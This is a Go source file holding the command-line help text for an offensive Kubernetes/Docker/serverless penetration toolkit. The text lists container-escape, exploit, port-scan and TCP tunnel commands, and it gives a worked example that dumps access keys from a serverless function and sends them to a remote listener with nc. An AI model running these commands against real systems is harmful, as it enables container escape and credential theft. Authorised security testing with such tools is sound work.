package cli

import (
	"log"
	"os"

	"github.com/docopt/docopt-go"
)

var BannerVersion = "cdk v0.1.10"

var BannerHeader = `Container DucK
Zero-dependency k8s/docker/serverless penetration toolkit by <i@cdxy.me>
Find tutorial, configuration and use-case in https://github.com/cdk-team/CDK/wiki
`

var BannerContainer = BannerHeader + `
Usage:
  cdk evaluate [--full]
  cdk eva [--full]
  cdk run (--list | <exploit> [<args>...])
  cdk auto-escape <cmd>
  cdk <tool> [<args>...]

Evaluate:
  cdk evaluate                              Gather information to find weakness inside container.
  cdk eva                                  Alias of "cdk evaluate".
  cdk evaluate --full                       Enable file scan during information gathering.

Exploit:
  cdk run --list                            List all available exploits.
  cdk run <exploit> [<args>...]             Run single exploit, docs in https://github.com/cdk-team/CDK/wiki

Auto Escape:
  cdk auto-escape <cmd>                     Escape container in different ways then let target execute <cmd>.

Tool:
  vi <file>                                 Edit files in container like "vi" command.
  ps                                        Show process information like "ps -ef" command.
  nc [options]                              Create TCP tunnel.
  ifconfig                                  Show network information.
  kcurl <path> (get|post) <uri> [<data>]    Make request to K8s api-server.
  ucurl (get|post) <socket> <uri> <data>    Make request to docker unix socket.
  probe <ip> <port> <parallel> <timeout-ms> TCP port scan, example: cdk probe 10.0.1.0-255 80,8080-9443 50 1000

Options:
  -h --help     Show this help msg.
  -v --version  Show version.
`
var BannerServerless = BannerHeader + `
THIS IS THE SLIM VERSION FOR DUMPING SECRET/AK IN SERVERLESS FUNCTIONS.

sessions in serverless functions will be killed in seconds, use this tool to dump AK/secrets in the fast way.

Usage:
cdk-serverless <scan-dir> <remote-ip> <port>

Args:
scan-dir                 Read all files under target dir and dump AK token.
remote-ip,port           Send results to target IP:PORT via TCP tunnel.

Example:
1. public server(e.g. 1.2.3.4) start listen tcp port 999 using "nc -lvp 999"
2. inside serverless function service execute "./cdk-serverless /code 1.2.3.4 999"
`

var Args docopt.Opts

func parseDocopt() {
	args, err := docopt.ParseArgs(BannerContainer, os.Args[1:], BannerVersion)
	if err != nil {
		log.Fatalln("docopt err: ", err)
	}
	Args = args
}
